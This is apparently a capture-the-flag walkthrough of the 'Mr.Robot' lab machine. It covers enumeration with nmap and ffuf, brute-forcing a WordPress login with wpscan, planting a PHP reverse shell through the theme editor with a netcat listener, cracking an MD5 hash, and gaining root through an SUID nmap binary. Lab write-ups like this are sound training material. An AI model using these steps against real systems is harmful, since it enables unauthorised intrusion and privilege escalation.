### Enumeration
- As always starting with nmap
- In parallel run ffuf

```bash
ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc all -fs <some value>
```
- While nmap and ffuf running in the terminal, in the browser I found a wordpress login page
- In wp login form - try sql injection, admin user gives nothing so I decide to try elliot (since it is Mr.Robot room) and I notice that error said wrong password for username elliot, so I got name.
- Next what I checked - robots file - and it was bingo, there is a dictionary with words (pay attention there are duplicates) and a first key
- Lets cleanup and keep a uniq only words

```bash
sort fsociety.dic | uniq > uniq_passwd.txt
```
- Since it is wordpress I used wpscan for scan and then to find a password

```bash
wpscan --url http://<ip> --usernames elliot --passwords passwd_unique.txt
```
- After login to the service - on leftside panel in `Appearance` I saw active `Editor` so it mean that i'm able to edit files
so I updated archive file with php-reverse-shell which I got from `/usr/share/webshells/php/php-reverse-shell.php`
now start netcat

```bash
nc -lvp 12345
```
- Go to http://<ip>/wp-content//themes/twentyfifteen/archive.php and catch the shell

### Shell stabilization
- !NB if you will not stabilize the shell you will be not able to switch user!

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- Press CTRL+Z to pause the session.

```bash
stty raw -echo; fg
```
- Press Enter

```bash
export TERM=xterm
```

### Machine investigation
- Checking available users

```bash
ls /home
```
- There I found a *robot* user who has 2 files - key2 (which I'm not able to readfrom current user) and some password file with some raw md5 encrypted password.
Usually I'm checking this kind of things on [crackstation](https://crackstation.net/) first and only if it is not able to decrypt - try another ways (hashcat or john). So crackstation did the thing quick so now we are able to become a *robot* user

```bash
su robot
```
### Privilege escalation
- `sudo -l` didn't work so I tried to find interesting things with sudo permissions

```bash
find / -type f -perm -4000 2>/dev/null
```
- Ok there is nmap so we can check [gtfobins](https://gtfobins.github.io/) how to get a shell via nmap

```bash
/usr/bin/something/nmap --interactive
nmap> !sh
```
- So now I'm root and able to read the last key3 file from the root folder.
Thans for reading my friend :)
